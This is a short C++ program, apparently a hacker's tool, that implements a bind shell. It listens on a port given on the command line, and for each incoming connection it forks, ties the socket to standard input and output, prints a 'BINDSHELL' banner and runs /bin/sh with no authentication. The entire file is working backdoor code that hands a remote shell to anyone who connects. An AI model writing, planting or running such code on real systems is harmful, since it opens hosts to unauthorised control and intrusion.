#include <iostream>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

enum STD_TYPE {STDIN, STDOUT, STDERR};

using namespace std;

int main(unsigned int argc, const char* argv[])
{
	int ss,cs,pid;

	struct sockaddr_in server;

	server.sin_family	= AF_INET;
	server.sin_port		= htons(atoi(argv[1]));
	memset(&server.sin_addr,INADDR_ANY,4);
	memset(server.sin_zero,0,8);

	ss = socket(AF_INET,SOCK_STREAM,0);

	if(bind(ss,(struct sockaddr*)&server,sizeof(struct sockaddr_in))==0)
	{
		listen(ss,1);
		while((cs = accept(ss,NULL,NULL))!=-1)
		{
			if((pid = fork())==0)
			{
				dup2(cs,STDIN); dup2(cs,STDOUT); dup2(cs,STDERR);
				cout << "WELCOME TO <l4t3n8> BINDSHELL" << endl;
				execl("/bin/sh","sh",0);
			}
			else if(pid != -1) waitpid(pid,NULL,0);
		}
	}

	close(ss);	close(cs);
	return 0;
}
